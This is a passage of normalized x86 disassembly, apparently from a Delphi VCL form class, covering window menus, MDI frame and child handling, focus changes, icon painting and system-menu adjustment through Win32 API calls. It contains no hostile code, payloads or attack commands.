push eax
call SetMenu
sub_4674e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4674cc
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_46753c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_467530
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_4675a8
push ebx
mov ebx eax
mov eax ebx
call sub_4526d0
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_467590
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_467590
mov edx eax
mov eax ebx
call sub_44ca14
mov edx 0xff00000f
mov eax ebx
call sub_44ca14
pop ebx
retn
sub_46762c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_4530b8
push eax
call ShowWindow
sub_46766c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_467084
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_467084
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_46aaf8
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46aae4
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_467084
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46aae4
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_46aaf8
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_46aae4
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_46aae4
call sub_46a7e8
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46aae4
call sub_46a7cc
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46aae4
call sub_46a7b4
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_46aae4
call sub_46a7b4
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_46aae4
call sub_46a7b4
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46aae4
call sub_46a800
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_46aae4
call sub_46a7e8
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46aae4
call sub_46a7cc
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_46aae4
call sub_46a7b4
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_46aae4
call sub_46a800
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_46aae4
call sub_46a7e8
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_46aae4
call sub_46a7e8
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_46aae4
call sub_46a7e8
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46aae4
call sub_46a7cc
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46aae4
call sub_46a7b4
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_46aae4
call sub_46a800
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_46aae4
call sub_46a7b4
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_46aae4
call sub_46a800
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_46aae4
call sub_46a7e8
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46aae4
call sub_46a7cc
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_4679c0
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_464f74
mov edx esi
mov eax edi
call sub_46a364
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_467a6f ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_44fedc
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_44fedc
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax DefMDIChildProcA
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_467bd9
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_464f84
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
mov eax ebx
call sub_468530
push eax
push 0x1
push 0x80
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_44c278
push eax
mov eax ebx
call sub_44c2bc
push eax
mov eax ebx
call sub_4530b8
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406d68
mov [ ebx + 0x254 ] eax
push ebx
push sub_466b1c
call sub_421fec
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_45d6c4
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_4530b8
push eax
call SetWindowPos
jmp r-xdata
sub_467d1e
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_467e49
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_450240
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_46a23c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467e50
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_467e58
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_4504ac
push 0x0
mov eax ebx
call sub_4530b8
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_467e9c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_450c30
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_4530b8
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4530b8
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_467f00
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_467fa8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467faf
lea eax [ ebp - 0x4 ]
call sub_404038
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
mov eax edi
call sub_464294
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_4034a4
mov eax ebx
call sub_4682b8
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_4034a4
test al al
jne r-xdata
sub_467fb8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_44fb94
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_44fb94
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_467f00
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_468000
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_467f00
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_468024
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_418a70
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_418950
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_418a70
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_418950
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_468294
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_4530b8
mov dx 0xb000
call sub_464020
test al al
jne r-xdata
call sub_4530b8
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_464020
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46829b
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403b20
jmp r-xdata
call sub_403b20
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_44fb94
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_4530b8
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_464020
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_44da78
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
call sub_403b20
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_4530b8
mov dx 0xb01a
call sub_464020
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403b20
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_44da78
sub_4682b8
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_44da78
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_4530b8
push eax
call SetFocus
mov eax ebx
call sub_4530b8
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_468308
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_44da78
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_4683bc
mov eax esi
call sub_4682b8
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_4534e0
mov edx eax
mov eax esi
call sub_467f00
sub_46836c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_466f84
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_44da78
mov eax ebx
call sub_466f84
mov edx esi
call sub_46836c
sub_4683bc
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_4611f0
mov edx esi
call sub_4611d4
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_468464
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
sub_4684b0
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_468464
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_4684e0
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_468464
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_46854c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_425154
xor eax eax
push ebp
push sub_4685fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_4255f0
xor eax eax
push ebp
push sub_4685d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_4034a4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4685de
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_4255f0
retn
sub_468608
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_466f84
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_466fb8
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_4034a4
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_452380
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_467004
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_4034a4
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_4686a8
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4530b8
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_4530b8
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_468530
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_4530b8
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_451248
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_468726
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_424ca4
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_468788
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4530b8
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_45150c
pop edi
pop esi
retn
sub_4687d4
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4530b8
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_4688d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
